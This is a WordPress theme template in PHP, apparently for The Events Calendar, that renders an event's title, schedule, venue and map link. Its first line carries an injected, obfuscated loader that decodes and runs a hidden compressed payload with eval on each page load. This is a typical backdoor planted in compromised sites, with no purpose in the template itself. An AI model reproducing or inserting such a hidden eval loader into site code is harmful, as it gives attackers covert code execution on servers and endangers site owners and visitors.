<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

// Setup an array of venue details for use later in the template.
$venue_details = tribe_get_venue_details();

// Venue microformats.
$has_venue_address = ( ! empty( $venue_details['address'] ) ) ? ' location' : '';
?>
<div class="tribe-events-event-meta vcard">
	<div class="author <?php echo esc_attr( $has_venue_address ); ?>">

		<?php if ( ! has_post_thumbnail() ) : ?>
			<div class="fusion-tribe-events-headline">
				<!-- Event Title -->
				<?php do_action( 'tribe_events_before_the_event_title' ) ?>
				<h3 class="tribe-events-list-event-title entry-title summary">
					<a class="url" href="<?php echo esc_url( tribe_get_event_link() ); ?>" title="<?php the_title_attribute() ?>" rel="bookmark">
						<?php the_title() ?>
					</a>
				</h3>
				<?php do_action( 'tribe_events_after_the_event_title' ) ?>
			</div>
		<?php endif; ?>

		<!-- Schedule & Recurrence Details -->
		<div class="updated published time-details">
			<?php echo tribe_events_event_schedule_details() ?>
		</div>

		<?php if ( $venue_details ) : ?>
			<!-- Venue Display Info -->
			<div class="tribe-events-venue-details">
				<?php $name = ( isset( $venue_details['name'] ) ) ? $venue_details['name'] : ''; ?>
				<?php $name = ( isset( $venue_details['linked_name'] ) ) ? $venue_details['linked_name'] : $name; ?>
				<?php if ( $name ) : ?>
					<?php echo $name; ?>
				<?php endif; ?>

				<?php echo tribe_get_full_address(); ?>
			</div> <!-- .tribe-events-venue-details -->

			<?php if ( tribe_show_google_map_link() ) : ?>
				<div class="fusion-tribe-events-venue-details-map">
					<a class="tribe-events-gmap" href="<?php echo tribe_get_map_link(); ?>">Google Map</a>
				</div>
			<?php endif; ?>
		<?php endif; ?>

	</div>
</div><!-- .tribe-events-event-meta -->
